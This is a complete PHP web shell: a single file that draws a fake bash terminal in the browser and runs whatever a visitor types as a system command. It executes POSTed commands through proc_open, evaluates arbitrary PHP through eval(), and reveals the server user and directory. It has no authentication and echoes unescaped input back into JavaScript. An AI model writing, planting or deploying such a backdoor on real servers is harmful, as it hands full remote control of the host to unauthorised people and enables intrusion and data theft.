<?php
//disable magic quotes!!
error_reporting(E_ALL^E_NOTICE);
$tf = explode('/', $_SERVER["SCRIPT_NAME"]);
$tf = $tf[count($tf)-1];
if (get_magic_quotes_gpc())
{
 $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
 while (list($key, $val) = each($process))
 {
  foreach ($val as $k => $v)
  {
   unset($process[$key][$k]);
   if (is_array($v))
   {
    $process[$key][stripslashes($k)] = $v;
    $process[] = &$process[$key][stripslashes($k)];
   }
   else
   {
    $process[$key][stripslashes($k)] = stripslashes($v);
   }
  }
 }
 unset($process);
}
//
function shell_exec2($str, $cwd)
{
 $pipes = array();
 $process = proc_open($str.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, $cwd);
 return stream_get_contents($pipes[1]);
}
if ($_POST['verify'])
{
 $dirnow = shell_exec2("pwd", $_POST['verify']);
 if (substr($dirnow, 0, strlen($dirnow)-1)==$_POST['verify'])
 {
  echo('document.getElementById("command").value += "\n";  newcmd();');
 }
 else
 {
  $ee = explode('/', $_POST['verify']);
  echo('document.getElementById("command").value += "\nbash: cd: '.$_POST['verify'].': Permission denied!\n";  newcmd();');
 }
 exit;
}
if ($_POST['jxcmd'] && $_POST['cwd']) //yea, go AJAX
{
 $thecmd = $_POST['jxcmd'];
 if (substr($thecmd, 0, 5)=="<php>")
 {
  eval('$result = '.substr($thecmd, 6).';');
 }
 else
 $result = shell_exec2($_POST['jxcmd']." 2>&1", $_POST['cwd']);
 if (substr($result, strlen($result)-1, 1)=="\n")
 {
  $result = substr($result, 0, strlen($result)-1);
 }
 echo('document.getElementById("command").value+='.json_encode($result).'+"\n";newcmd();document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;');
 exit;
}
echo('<style>body {background-color: black; color: white; font-size: 12px;}</style><script>'); ?>
window.onload = setthesize;
window.onresize = setthesize;
window.updir = 0;
window.commands = new Array();
window.loggeduser = "<?php
$cmd = shell_exec2("whoami", NULL);
if (strpos($cmd, "not found")===FALSE)
{
 echo(substr($cmd, 0, strlen($cmd)-1)); 
}
?>";
window.cwd = "<?php
$cmd = shell_exec2("pwd", NULL);
if (strpos($cmd, "not found")===FALSE)
{
 echo(substr($cmd, 0, strlen($cmd)-1)); 
}
?>";
window.homecwd = "<?php
$cmd = shell_exec2("pwd", NULL);
if (strpos($cmd, "not found")===FALSE)
{
 echo(substr($cmd, 0, strlen($cmd)-1)); 
}
?>";
function setthesize()
{
 document.getElementById("command").style.height=(window.innerHeight-20)+"px";
 document.getElementById("command").style.width=(window.innerWidth-20)+"px";
 document.getElementById("command").selectionStart=document.getElementById("command").value.length;
 document.getElementById("command").selectionEnd=document.getElementById("command").value.length;
 document.getElementById("command").focus();
}
function appenddirectory(str)
{
 if (str.substr(0, 1)=="/")
 window.cwd = str;
 else
 {
  var c = window.cwd+"/"+str;
  var real = new Array();
  c = c.split("/"); var i;
  for(i=0;i<c.length;i++)
  {
   if ((c[i] == "..") && real.length>0)
   {
    real.splice(real.length-1, 1);
   }
   else if ((c[i] != ".") && (c[i] != ""))
   real.push(c[i]);
  }
  window.cwd = "/"+real.join("/");
 }
}
function writelastline(str)
{
 var call = document.getElementById("command").value.split("\n"), i;
 call[call.length-1] = str;
 document.getElementById("command").value = call.join("\n");
}
function cmdup(e)
{
 if (window.commands.length>(window.updir))
 {
  window.updir++;
  writelastline("");
  newcmd();
  document.getElementById("command").value += window.commands[window.commands.length-window.updir];
 }
 if (e.stopPropagation)
 {
  e.stopPropagation();
  e.preventDefault();
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function cmdown(e)
{
 if (window.updir>1)
 {
  window.updir--;
  writelastline("");
  newcmd();
  document.getElementById("command").value += window.commands[window.commands.length-window.updir];
 }
 if (e.stopPropagation)
 {
  e.stopPropagation();
  e.preventDefault();
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function postAsynchronousAjax(url, values)
{
 var xmlhttp;
 if (window.XMLHttpRequest)
 {
  xmlhttp=new XMLHttpRequest()
  xmlhttp.open("POST",url,true);
  xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xmlhttp.send(values);
  xmlhttp.onreadystatechange=function()
  {
   if (xmlhttp.readyState==4)
   {
    if (xmlhttp.status==200)
    {
     eval(xmlhttp.responseText);
    }
   }
  }
 }
 else if (window.ActiveXObject)
 {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")
  if (xmlhttp)
  {
   xmlhttp.open("POST",url,true);
   xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   xmlhttp.send(values);
   xmlhttp.onreadystatechange=function()
   {
    if (xmlhttp.readyState==4)
    {
     if (xmlhttp.status==200)
     {
      eval(xmlhttp.responseText);
     }
    }
   }
  }
 }
}
function urlencode (str)
{
 return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').
 replace(/\)/g, '%29').replace(/\*/g, '%2A').replace(/%20/g, '+');
}
function newcmd()
{
 document.getElementById("command").value += "["+window.loggeduser+"@<?php echo($_SERVER['HTTP_HOST']); ?> "+((window.cwd=="/")?("/"):(window.cwd.split("/")[window.cwd.split("/").length-1]))+"]# ";
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function exec(e)
{
 window.updir=0;
 var all = document.getElementById("command").value.split("\n");
 if (all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2)=="clear")
 {
  window.commands = new Array();
  document.getElementById("command").value="";
  newcmd();
  e.preventDefault();
 }
 else if (all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2, 2)=="cd")
 {
  e.preventDefault();
  window.commands.push(all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2));
  if (all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(5)=="~")
  {
   window.cwd = window.homecwd;
   document.getElementById("command").value += "\n";  newcmd();
  }
  else
  {
   appenddirectory(all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(5));
   postAsynchronousAjax("<?php echo($tf); ?>", "verify="+urlencode(window.cwd));
  }
 }
 else
 {
  e.preventDefault();
  document.getElementById("command").value += "\n";
  window.commands.push(all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2));
  postAsynchronousAjax("<?php echo($tf); ?>", "jxcmd="+urlencode(all[all.length-1].substr(all[all.length-1].indexOf("#")).substr(2))+"&cwd="+window.cwd);
 }
 document.getElementById("command").scrollTop=document.getElementById("command").scrollHeight;
}
function bsp(e)
{
 var all = document.getElementById("command").value.split("\n");
 if (all[all.length-1].length==(all[all.length-1].indexOf("#")+2))
 e.preventDefault();
}
<?php echo('function parsekey(e, ths){if (e.keyCode==13){exec(e);}else if(e.keyCode==38){cmdup(e);return false;}else if(e.keyCode==40){cmdown(e);return false;}else if(e.keyCode==8){bsp(e);}}</script><textarea rows=7 cols=130 id="command" onkeypress="parsekey(event, this);"></textarea><br>');?>
<script>
newcmd();
</script>
